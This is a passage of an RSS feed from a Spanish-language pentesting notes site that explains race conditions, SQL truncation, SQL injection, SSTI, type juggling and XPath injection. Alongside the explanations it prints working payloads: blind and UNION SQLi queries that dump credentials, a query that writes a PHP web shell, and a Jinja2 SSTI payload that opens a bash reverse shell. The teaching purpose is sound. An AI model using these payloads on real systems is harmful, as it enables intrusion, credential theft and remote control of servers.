Copy<br>Esto es una web local por el puerto 5000 la cual cuando ingresamos un parámetro x (:value), crea un archivo llamado shared-file.txt con el contenido ingresado como parámetro, por lo que si ponemos 'http://localhost:5000/dobliuw', nos intentara descargar un archivo shared-file.txt con el contenido dobliuw. <br>Que pasa con esto? En principio, así como en el caso anterior, de puede acontecer un Racea Condition ya que, imaginemos que múltiples usuarios intentan crear su archivo en simultaneo, no solo podría acontecerse un DoS, si no que, en algún momento, podría llegar a ver la petición de otros usuarios, descargando así archivos con un contenido distinto al ingresado.<br>Esto se puede probar haciendo uso de <a data-href="Burpsuite" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/burpsuite.html" class="internal-link" target="_self" rel="noopener nofollow">Burpsuite</a>, en donde si preparamos una petición a la url 'http://localhost:5000/burpsuite' y por otro lado desde consola ejecutamos la siguiente línea: <br>while true, do curl -s -X GET 'http://localhost:5000/dobliuw' | grep -v "dobliuw" ; done
Copy<br>Estaríamos tramitando múltiples llamadas de intento de creación del archivo shared-file.txt con el contenido dobliuw, por lo que si ahora tramitamos la petición de burpsuite, en donde indicamos que (Según el código) queremos crear el archivo shared-file.txt con el contenido burpsuite, muy posiblemente en algún momento veamos el contenido dobliuw en la petición tramitada por <a data-href="Burpsuite" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/burpsuite.html" class="internal-link" target="_self" rel="noopener nofollow">Burpsuite</a> y en la consola veamos el contenido burpsuite.  ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/race-conditions.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/Race Conditions.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:46:44 GMT</pubDate></item><item><title><![CDATA[¿ Que es <strong>RCE</strong> ?]]></title><description><![CDATA[ 
 <br><br>Como sus siglas lo indican, hablamos de RCE cuando logramos ejecutar comandos de manera remoto en la maquina victima, esto se puede dar de muchas formas y es a lo que todo atacante aspira, una vez con RCE asegurados, solo queda entablar una técnica de las <a data-href="Shells" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/explotation-concepts/shells.html" class="internal-link" target="_self" rel="noopener nofollow">Shells</a> para entablar conexión y tener asi, total y completo control sobre la máquina victima. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/RCE - (Remote Command Execution).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:46:59 GMT</pubDate></item><item><title><![CDATA[¿ Que es <strong>Session Puzzling</strong> ?]]></title><description><![CDATA[ 
 <br><br>El término Session Puzzling se utiliza a veces para referirse a la vulnerabilidad de Session Fixation, pero desde el punto de vista del atacante que intenta Adivinar o generar identificadores de sesión válidos. <br><br><br>La vulnerabilidad Session Fixation se produce cuando un atacante establece un identificador de sesión válido para un usuario y luego espera a que el usuario inicie sesión. Si el usuario inicia sesión con ese identificador de sesión, el atacante podría acceder a la sesión del usuario y realizar acciones maliciosos en su nombre. Para lograr esto, el atacante puede engañar al usuario para que haga click en un enlace que incluye un identificador de sesión válido o explotar una debilidad en la aplicación web para establecer el identificador de sesión. <br><br><br>El término Session Variable Overloading se refiere a un tipo específico de ataque de Session Fixation en el que el atacante envía una gran cantidad de datos a la aplicación web con el objetivo de sobrecargar las variables de sesión. Si la aplicación web no valida adecuadamente la cantidad de datos que se pueden almacenar en las variables de sesión, el atacante podría sobrecargarlas con datos maliciosos y causar problemas en el rendimiento de la aplicación. <br><br><br>Para prevenir estas vulnerabilidades, es importante utilizar identificadores de sesión aleatorios y seguros, validar autenticación y autorización del usuario antes de establecer una sesión y limitar la cantidad de datos que se pueden almacenar en las variables de sesión.  ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/session-puzzling-session-fixation-session-variable-overloading.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/Session Puzzling - Session Fixation - Session Variable Overloading.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:47:24 GMT</pubDate></item><item><title><![CDATA[¿ Que es el <strong>ataque de truncado SQL</strong> ?]]></title><description><![CDATA[ 
 <br><br>El ataque de truncado SQL, también conocido como SQL Truncation Attack, es una técnica de ataque en la que un atacante intenta truncar o cortar una consulta SQL para realizar acciones maliciosas en una base de datos. <br><br><br>Para prevenir el ataque de truncado SQL, es importante validar adecuadamente todos los datos de entrada de usuario que se utilizan en las consultas SQL. La validación debe incluir tanto la longitud como el formato de los datos de entrada. <br><br><br>Un ejemplo común de este tipo de ataque es cuando una aplicación web tiene un campo de entrada que limita la longitud de los datos, como el correo electrónico, y no valida adecuadamente los datos de entrada. <br>Supongamos por ejemplo una página la cual dispone de un campo de registro para crear un nuevo usuario. En este campo de registro, el usuario debe proporcionar una dirección de correo y la contraseña del usuario en cuestión que desea crear. ahora bien, de cara a la inserción de estos datos en la base de datos, supongamos que el campo correspondiente a la dirección email que introduce el usuario, está limitado a 17 caracteres en la base de datos. <br>Suponiendo que por ejemplo el usuario admin@admin.com ya existe en la base de datos, de primeras no sería posible registrar este mismo usuario, debido a que la query SQL que se aplicaría por detrás lo consideraría como una entrada duplicada. Sin embargo, dado que el correo admin@admin.com tiene un total de 15 caracteres y todavía no hemos llegado al límite, un atacante lo que podría intentar hacer es registrar al usuario 'admin@admin.com  a' , es decir, 'admin@admin.com[espacio][espacio]a'<br>Esta nueva cadena que hemos representado para el correo electrónico, en este caso tienen un total de 18 caracteres. De primeras el correo es distinto al correo ya existenten en la base de datos (admin@admin.com), sin embargo, debido a su limitación en 17 caracteres, tras pasar el primer filtro y proceder a su inserción en la base de datos, la longitud total de la cadena se acota a los 17 caracteres, resultando en la cadena admin@admin.com  , (admin@admin.com[Espacio][Espacio]). <br>Ahora bien, ¿qué pasa con los espacios?, pues dado que no representan "información de valor", por decirlo de alguna forma, lo que sucederá es que se truncarán. A lo que nos referimos con esto del truncado de los espacios al final de la cadena, es a la eliminación automática de los mismos. De esta forma, la cadena resultante final se quedaría en admin@admin.com, consiguiendo tras su inserción en la base de datos cambiar su contraseña a la especificada durante la fase de registro para nuestro supuesto 'nuevo usuario'. <br>Este ataque funcionará para casos donde la aplicación web no valide adecuadamente los datos de entrada y corte o trunque la consulta SQL en lugar de mostrar un mensaje de error. En consecuencia, el atacante puede aprovechar esta debilidad par realizar acciones maliciosas en la base de datos, como modificar o eliminar datos, acceder a información confidencial o tomar el control de una cuenta de usuario. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/sql-truncation.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/SQL Truncation.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:47:35 GMT</pubDate></item><item><title><![CDATA[¿ Que es SQL ?]]></title><description><![CDATA[ 
 <br><br><a data-href="SQL" href="https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener nofollow">SQL</a> es un lenguaje de programación, sus siglas Structured Query Language. Consiste en un lenguaje de administración y recuperación de datos alojados en Base de datos.<br><br><br>Una SQLI (SQL Injection) es una técnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que no validan adecuadamente la entrada del usuario en la consulta <a data-href="SQL" href="https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener nofollow">SQL</a> que se envía a la base de datos. Los atacantes pueden utilizar esta técnica para ejecutar consultas <a data-href="SQL" href="https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener nofollow">SQL</a> maliciosas y obtener información confidencial como nombres de usuarios, contraseñas y otra información almacenada en la base de datos. <br><br><br>Como se meciono anteriormente una SQLI se produce cuando un atacante inserta código <a data-href="SQL" href="https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener nofollow">SQL</a> malicioso en los campos de entrada de una aplicación web. Si la aplicación no valida adecuadamente la entrada del usuario, la consulta <a data-href="SQL" href="https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener nofollow">SQL</a> maliciosa se ejecutará en la base de datos, lo que permitirá al atacante obtener información confidencial o incluso controlar la base de datos. <br>Para usar a modo de ejemplo, utilizaremos el sig archivo de php para suponer un ejemplo de un caso de como podria estar estructurado el codigo en php para que estas SQLI se ocacionen. <br>&lt;?php
	$host='localhost';
	$user='user';
	$password='password';
	$database='database';
	$conn = new mysqli($host, $user, $password, $database);
	
	$id = $_GET['id']; 
	$data = mysqli_query($conn, "SELECT username FROM users WHERE user_id = '$id' ");

	$response = mysqli_fetch_array($data);
	echo $response['username'];
?&gt;
Copy<br>En este ejemplo utilizamos un simple archivo de php el cual tiene las credenciales, el host y la base de dato a  usar, posteriormente de realizar la conexión lee el input del usuario y ejecuta una query de <a data-href="SQL" href="https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener nofollow">SQL</a> sin sanitización alguna, para posteriormente imprimir en el navegador el nombre del usuario. Esto es lo que podria ocacionar la SQLI, el hecho de que se lea la query 'id' y se confie en esta...<br><br><br>Es importante entender que el objetivo de toda SQLI, como se menciono anteriormente, es dumpear datos de una base de datos, como sabemos, en <a data-href="SQL" href="https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener nofollow">SQL</a> las base de datos son tablas, que contienen columnas y registros, por lo que para poder llevar a cabo cualquier SQLI vista a continuación es importante saber las base de datos, las tablas y las columnas de lo que querramos dumpear, por lo que, usando MySQL a continuación se explica como obtener esto: <br>!ACLARACIÓN! No en todos los gestores de SQL las querys de ejemplo funcionaran, ya que estos tienen algunos leves cambios, pero aquellos cambios más relevantes para los distintos gestores se pueden ver en esta <a data-tooltip-position="top" aria-label="https://portswigger.net/web-security/sql-injection/cheat-sheet" rel="noopener nofollow" class="external-link" href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank">cheat sheat</a><br>
<br>


<br>SELECT schema_name FROM information_schema.schemata;
Copy<br>
<br>


<br>SELECT table_name FROM information_schema.tables WHERE table_schema='db_name';
Copy<br>
<br>


<br>SELECT column_name FROM information_schema.columns WHERE table_schema='db_name' AND table_name='table_name';
Copy<br> Ahora si.... Existen varios tipos de SQLI.<br><br>
<br>

Este tipo de SQLI aprovecha errores en el código SQL para obtener información. Por ejemplo, si la consulta  devuelve un error con un mensaje específico, se puede utilizar ese mensaje para obtener información adicional del sistema. 

<br>


<br>Supongamos que el script anterior en lugar de tener la línea del echo $response['username']; la cual simplemente imprime en el navegador el nombre del usuario, es una línea que tiene una condición de que en caso de que la query no haya devuelto nada arroja 404 y de lo contrario realiza otra x acción <br># SCRIP ANTERIOR 
	if(!isset($response['useranme'])){
		http_response_code(404); 
	}
Copy<br>De esta manera, si en la query ingresamos un "1", devuelve 200 ya que el usuario existe pero no realiza nada más que eso la web, bueno...  abusando de este status code 404 en caso de que sea  false y 200 en caso de que sea true se pueden realizar SQLI basadas en tiempo, basadas en booleanos, basadas en uniones y basadas en stacked queries.<br>Y como complejisación adicional, la línea de $id = $_GET['id'] , ahora continene una sanitización la cual al ingresar caracteres especiales estos se escapan, siendo imposible asi ingresar comillas y demás. <br># SCRIP ANTERIOR
# VIEJA LINEA: 
$id = $_GET['id'];
# NUEVA LINEA: 
$id = mysqli_real_escape_string($conn, $_GET['id']);
Copy<br>Por ultimo, tomemos el ejemplo en donde el usuario a su vez, en la línea de la query SELECT username FROM users WHERE user_id='$id' ahora no el user_id=$id NO tiene comillas, de esta manera por un nuevo error, el sistema sigue siendo vulnerable a SQLI pero de una manera un poco más compleja.<br><br>
<br>

Este tipo de SQLI utiliza una consulta que tarda un determinado tiempo en ejecutarse para obtener información. Por ejemplo, si se utiliza una consulta que realiza una búesqueda en una tabla y se añade un retado en la consulta, se puede uitilizar ese retardo para obtener información adicional. 
<br>Ejemplo con caso anterior: <br><br>SELECT username FROM users WHERE user_id='%d'
Copy<br><br>-- Supongamos que realizamos la prubea de ingresar el usuario 1 y devuelve 200 OK  
SELECT username FROM users WHERE user_id=1 
-- Ahora ingresamos el usuario 1241 y devuelve 404
SELECT username FROM users WHERE user_id=1241
-- Ahora jugamos con el tiempo para corroborar si la petición devuelve 200 OK a los 5s de ejecutarla (Indicando asi, que es TRUE)
SELECT username FROM users WHERE user_id=1241 OR if(ascii(substr((select group_concat(name,0x3a,password) from users),1,1))=97,sleep(5),1)
Copy<br>Con esta QUERY maliciosa OR if(ascii(substr((select group_concat(name,0x3a,password) from users),1,1))=97,sleep(5),1) estamos abusando de que el usuario 1241 no existe para verificar si esta sentencia se cumple, pidiendo que si el codigo ascii del primer caracter del conjunto de valores de "name" + 0x3a (":") + "password" es igual a 97 (Letra 'a' en codigo ascii), hagamos que la página tarde en responder 5s (sleep(5)), de lo contrario devolvemos solo un 200 OK.<br><br>
<br>

Este tipo de SQLI utiliza consultas con expresiones booleanas para obtener información adicioanl. Por ejemplo, se puede utilizar una consulta con una expresión booleana para determinar si un usuario existe en una base de datos.
<br><br>SELECT username FROM users WHERE user_id='%d'
Copy<br><br>-- Supongamos que realizamos la prubea de ingresar el usuario 1 y devuelve 200 OK  
SELECT username FROM users WHERE user_id=1 
-- Ahora ingresamos el usuario 1241 y devuelve 404
SELECT username FROM users WHERE user_id=1241
-- Ahora jugamos con el booleano, ya que sabemos que la primea petición no se cumple si se cumple la 2da podriamos ir deduciendo los datos
SELECT username FROM users WHERE user_id=1241 OR (select ascii(substr(group_concat(name,0x3a,password),1,1))=97)
Copy<br>Con esta QUERY maliciosa (select ascii(substr(group_concat(name,0x3a,password),1,1))=97) muy similar a la condición de tiempo, estamos abusando de que el usuario 1241 no existe para corroborar si la segunda query es TRUE y asi saber los valores, en este caso seleccionamos el conjunto de datos del nombre y la contraseña para fijarnos si el primer caracter en codigo ascii es un valor '97' en codigo ascii, equivalente a una 'a', de esta manera si el primer usuario fuera admin, la primera letra del mismo seria una a, en codigo ascii 97 y la query quedaria 97=97, por lo que seria true y devolveria un 200 OK.<br><br>
<br>

Este tipo de SQLI utiliza la cláusila "UNION" para combinar dos o más consultas en una sola. Por ejemplo, si se utiliza una consulta que devuelve información sobre los usuarios y se agrega una cláusula "UNION" con otra consulta que devuelve información sobre los permisos, se puede obtener información adicional sobre los permisos de los usuarios. 
<br>Es importante tener en cuenta que para esta SQLI funcione, hace falta saber las columnas que esta siendo seleccionadas para asi poder unir datos, esto se da por entendido en ya que se toca en <a data-href="SQL" href="https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener nofollow">SQL</a>. <br><br>SELECT username FROM users WHERE user_id='%d'
Copy<br><br>-- Supongamos que realizamos la prubea de ingresar el usuario 1 y devuelve 200 OK ASI COMO TAMBIEN ALGUN DATO EN PANTALLA DEL USUARIO 
SELECT username, password FROM users WHERE user_id=1 
-- Ahora jugamos con order by para averiguar cuantas columnas se estan trayendo
SELECT username FROM users WHERE user_id=1241 order by 2
-- Una vez tengamos el número exacto de columnas podriamos insertar valores que nos interezaran para ver si alguno de los campos es vulnerable y se muestra en pantalla

-- Por ejemplo, desde mysql interactivo si traemos los datos con la primera query veriamos: 
--+---------+-------------------------------+
--| name    | password                      |
--+---------+-------------------------------+
--| Dobliuw | U2!+BF!.hZy1ST4r1&amp;6*&amp;3Uu1&amp;3mI |
--+---------+-------------------------------+

-- Luego ejecutariamos la query maliciosa:
SELECT usrename, password FROM users WHERE user_id=1 union select group_concat(email,0x3a,password),null from users; 
-- Puediendo ver algo similar a esto: 
-------------------------------------------------------------------------------+-------------------------------+
--| name                                                                                                                                                                                                                                                                      --| password                      |
--+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------+
--| Dobliuw                                                                                                                                                                                                                                                                   --| U2!+BF!.hZy1ST4r1&amp;6*&amp;3Uu1&amp;3mI |
--| dobliuw@dobliuw.com:U2!+BF!.hZy1ST4r1&amp;6*&amp;3Uu1&amp;3mI,zaikoarg@zaikoarg.com:Z41k0+!1&amp;dDxD_,valenmachu@gmail.com:1254821158644468,brian@gmail.com:Tomi2008,jose32@gmail.com:jose32,robertoperez@gmail.com:roberto1980,david@gmail.com:mihijoelmejor,testing@gmail.com:test!123 | NULL                          |
--+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------+

Copy<br>Como podemos ver, en este ejemplo desde la consola, estariamos uniendo junto a una respuesta true, los datos que a nosotros nos interesarian dumpear de una base de datos en especifico, para esto es importante primero haber obtenido todas las columnas para una determinada tabla de una determinada base de dato como se explico anteriormente.<br><br>
<br>

Este tipo de SQLI aprovecha la pobilidad de ejecutar múltiples consultas en una sola sentencia para obtener información adicional. Por ejempllo, se puede utilizar una consulta que inserta un registro en una tabla y luego agrega una consulta adicional que devuelve información sobre la tabla.
<br><br><br><br>SELECT x FROM x WHERE x='%s' UNION SELECT database() 
Copy<br><br>SELECT x FROM x WHERE x='%s' UNION SELECT @@version
Copy<br><br>SELECT x FROM x WHERE x='%s' UNION SELECT load_file('etc/passwd')
Copy<br><br>SELECT x FROM x WHERE x='%s' UNION SELECT '&lt;?php echo "&lt;pre&gt;" . shell_exec($_GET[\'cmd\']) . "&lt;/pre&gt;"; ?&gt;' INTO outfile '/tmp/file.php'
Copy<br><br><br>Es importante hacer una breve distinción entre los diferentes tipo de base de datos.<br>
<br>

Las inyescciones <a data-href="SQL" href="https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/sql/sql.html" class="internal-link" target="_self" rel="noopener nofollow">SQL</a> son más comunes en bases de datos relacionales como MySQL, SQL Server, Oracle, PostgreSQL, entre otros. En estas base de datos, se utilizan consultas SQL para acceder a los datos y realizar operaciones en la base de datos.

<br>

Aunque las inyecciones SQL son menos comunes en base de datos NoSQL, todavía es posible realizar este tipo de ataque. Las bases de datos NoSQL, como MongoDB o Cassandra, no utilizan el lenguaje SQL, sino un modelo de datos diferete. Sin embargo, es posible realizar inyescciones de comandos en las consultas que se realizan en estas bases de datos. 

<br>

Las bases de datos de grados, como Neo4j, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan para acceder a los nodos y relaciones que se han almacenado en la base de datos.

<br>

Las bases de datos de objetos, como db4o, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para accesder a los objetos que se han almacenado en la base de datos.

<br><br>Todos los ataques se pueden probar en páginas como <a data-tooltip-position="top" aria-label="https://portswigger.net/" rel="noopener nofollow" class="external-link" href="https://portswigger.net/" target="_blank">Portswigger</a> (Un laboratorio de Vulnerabilidades Webs la cual incluye SQLI), en local jugando con propios scrips y bases de datos, con contenedores de <a data-href="Docker" href="https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/docker.html" class="internal-link" target="_self" rel="noopener nofollow">Docker</a> que podemos encontrar con vulnerabilidades de SQLI y en páginas que funcionan como un gesto de MySQL Online como <a data-tooltip-position="top" aria-label="https://extendsclass.com/mysql-online.html" rel="noopener nofollow" class="external-link" href="https://extendsclass.com/mysql-online.html" target="_blank">ExtendsClass</a>]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/sqli-(sql-injections).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/SQLI - (SQL Injections).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:48:11 GMT</pubDate></item><item><title><![CDATA[¿ Que es un <strong>SSTI</strong> ?]]></title><description><![CDATA[ 
 <br><br>Un Server-Side Template Injection ( SSTI ) es una vulnerabilidad de seguridad en la que un atacante puede inyectar código malicioso en una plantilla de servidor. <br>Las plantillas de servidor son archivos que contienen código que se utiliza para generar contenido dinámico en una aplicación web. Los atacantes puede aprovechar una vulerabilidad SSTI para inyectar código malicioso en una platinllar de servidor, lo que les pertmite ejecutar comandos en el servidor y obtener acceso no autorizado tanto a la apliación web como a posibles datos sensibles. <br><br><br>Cuando solemos ver que un campo que ingresamos, sea de formulario o url, es representado en el output de la página web y sabemos que por detras corre un framework o plantilla como Django, Flask, Ruby on Rails, entre otros, podemos empezar a pensar en un SSTI, pudiendo sacar posibles comandos a inyectar de páginas como <a data-tooltip-position="top" aria-label="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" rel="noopener nofollow" class="external-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank">Payload All The Things</a>.<br>De esta manera, supongamos que tenemos decubrimos con whatweb o wapalyzer que nuestra aplicación corre Flask, ingresamos a la app y vemos que tenemos un campo:<br><img alt="SSTI_Example.png" src="https://dobliuw.com/lib/media/ssti_example.png"><br>El cual vemos que se representa en el output: <br><img alt="SSTI_Example2.png" src="https://dobliuw.com/lib/media/ssti_example2.png"><br>Podemos empezar a probar cosas, en este caso probando inputs como {{7*7}}, {{config.items()}}, entre otros.  (Todos obtenidos de la sección de <a data-tooltip-position="top" aria-label="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2" rel="noopener nofollow" class="external-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2" target="_blank">python</a> de <a data-tooltip-position="top" aria-label="https://github.com/swisskyrepo/PayloadsAllTheThings" rel="noopener nofollow" class="external-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">PayloadAllTheThings</a>), en caso de que veamos un output esperado ante estos payloads, podriamos verificar si se logran ejecutar comandos del sistema con el payload para realizarlo, y en caso de que si, solo quedaria ganar acceso con algun metodo dentro de las <a data-href="Shells" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/explotation-concepts/shells.html" class="internal-link" target="_self" rel="noopener nofollow">Shells</a>. <br>Ejemplo {% raw %}{{ self.init.globals.builtins.import('os').popen('bash -c "bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1"').read() }}{% endraw %}]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/ssti-(server-side-template-injection).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/SSTI - (Server-Side Template Injection).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:48:55 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/ssti_example.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/ssti_example.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[¿ Que es <strong>Type Juggling</strong> ?]]></title><description><![CDATA[ 
 <br><br>Un ataque de Type Juggling es una técnica utilizada en porgramación para manipular el tipo de dato de una variable con el fin de engañar a un programa y hacer que éste haga algo que no debería. <br>La mayoría de los lenguajes de programación utilizan tipos de datos para clasificar la información almacenada en una varibale, como enteros, cadenas, flotantes, booleantos, etc. Los programas utilizan estos tipos de datos para realizar operanciones matemáticas, comparaciones y otras tareas especifícas. Sin embargo, los atacantes puede explotar vulnerabilidades en los programas que no validan adecuadamente los tipos de datos que se les proporcionan.<br>En un ataque de Type Juggling, un atacante manipula los datos de entrada del programa para cambiar el tipo de dato de una variable. Por ejemplo, el atacante podría proporcionar una cadena de caracteres que "se parece" a un número entero, pero que en realidad no lo es. Si el programa no valida adecuadamente el tipo de dato de la variable, podría intentar realizar operaciones matemáticas en esa variable y obtener resultados inesperados. <br><br><br>Por ejemplo, en PHP, una cadena que comienza con un número se convierte automáticamente en un número se se utiliza en una comparación númerica. Por lo tanto, si el atacante proporciona una cadena que comienza con el número 0, como 00123, el programa convertirá en el número entero 123. <br>$num = 10; 
$str_num = '10'; 
if($num == $str_num){ echo "Los valores son iguales"}
// Esto se mostrara en consola ya que "son iguales"
$str_num = '000000010'; 
if($num == $str_num){ echo "Los valores son iguales"}
// Esto se volvera a mostrar en consola ya que vuelven a "ser iguales"
Copy<br>Esto también se podría ver con manipulaciones de hashes md5 en php, por ejemplo si tenemos una contraseña valida la cual es 240610708, su hash md5 sería 0e4620974...., pero si en el código se aplicase una doble comparación, podríamos ingresar una contraseña la cual su hash md5 también empiece con 0e.... (Como por ejemplo QBKCDZO), y al usar una doble comparativa, el hash md5 si interpreta como una potencia de 0 a la 4620974... lo que da como resultado 0, por lo que la comparativa termina siendo 0==0<br>$password = md5('240610708');
$type_juggling = md5('QBKCDZO');
if($password == $type_juggling){ echo "Las credenciales son correctas."; } 
// Esto una vez más, se mostrara en consola. 
Copy<br>De cara a peticiones HTTP que se tramitan con un formato similar a user={username}&amp;pass={password}, para acontecer un Type Juggling podríamos simplemente agregar unos corchetes [ ] en el dato que querramos cambiar por ejemplo user={valid_username}&amp;pass[]={invalid_password}. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/type-juggling.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/Type Juggling.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:48:58 GMT</pubDate></item><item><title><![CDATA[¿ Que es <strong>XPath</strong> ?]]></title><description><![CDATA[ 
 <br><br>XPath es un lenguaje de consultas utilizado en XML que permite buscar y recuperar información específica de documentos XML. Sin embargo, al igual que otros lenguajes de programación y consultas, XPath tmabién puede tener vulnerabilidades que los atacantes pueden aprovechar para comprometer la seguridad de una aplicación web. <br>Las vulnerabilidades XPath son aquellas que se aprovechan de las debilidades en la implementación de consultas XPath en una aplicación web. A continuación, se describen algunos tipos de vulnerabilidades comunes en XPath: <br>
<br>Inyección XPath: Los atacantes pueden utilizar inyección de código malicioso en las consultas XPath para alterar el comportamiento de la aplicación. Por ejemplo, pueden agregar una consulta maliciosa que recupere toda la información del usuario, incluso información confidencial como contraseñas. 
<br>Fuerza bruta de XPath: Los atacantes pueden utilizar técnicas de fuerza bruta para adivinar las rutas de XPat y recuperar información confidencail. Esta técnica se basa en intentar diferentes rutas XPath hasta encontrar una que devuelva información confidencial. 
<br>Recuperación de información del servidor: Los atacantes pueden utilizar consultas XPath maliciosas para obtener información sobre el servidor, como el tipo de base de datos, la versió mde la aplicación, etc. Esta información puede ayudar a los atacantes a planear ataque smás sofisticados. 
<br>Manipulación de respuestas XPath: Los atacantes pueden manipular las respuestas XPath de la aplicación web para obtener información adicional o alterar el comportamiento de la aplicación. Por ejemplo, pueden modificar una respuesta XPath para crear una cuenta de usuario sin permiso. 
<br><br><br>Para protegerse contra las vulnerabilidades XPath, es importante validar todas las entradas de usuario y evitar la construcción dinámica de consultas XPath. Además, se recomienda restringir los permisos de acceso a los recursos de la aplicación web y mantener actualizado el software y los sistemas operativos. Por último, se recomienda utilizar herramientas de análisis de seguridad y realizar pruebas de penetración regulares para identificar y corregir cualquie rvulnerabilidad en la aplicación web. <br><br><br>Como en las <a data-href="SQLI - (SQL Injections)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/sqli-(sql-injections).html" class="internal-link" target="_self" rel="noopener nofollow">SQLI - (SQL Injections)</a> y en las <a data-href="NoSQLI - (NoSQL Injections)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/nosqli-(nosql-injections).html" class="internal-link" target="_self" rel="noopener nofollow">NoSQLI - (NoSQL Injections)</a>, esto comienza por un campo que parece posiblemente vulnerable a alugna inyeccion de estas, por lo que de primeras provariamos tanto SQLI como NoSQLI, pero podría ser el caso de que la query ' or '1'='1 funcione aumentando aun más las sospechas de una posbile inyección, pero al continuar probando multiples querys maliciosas de SQLI y NoSQLI veriamos que no llegamos a nada.<br>En este punto, podríamos empezar a barajar la posiblidad de estar enfrente a una XPath Injection. Por lo que sabemos, XPath es un lenguaje de consultas dirigido hacia un archivo en formato XML, por lo cual la idea principal sería comenzar a tramitar inyecciones XPath para dumpear el archivo XML. <br>Lo primero es intentar verificar cuantes etiquetas PRIMARIAS existen, es decir, en una estructura XML tal que así: <br>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;data&gt;
	&lt;user&gt;
	    &lt;name&gt;pepe&lt;/name&gt;
	    &lt;password&gt;peponcio&lt;/password&gt;
	    &lt;account&gt;admin&lt;/account&gt;
	&lt;/user&gt;
	&lt;user&gt;
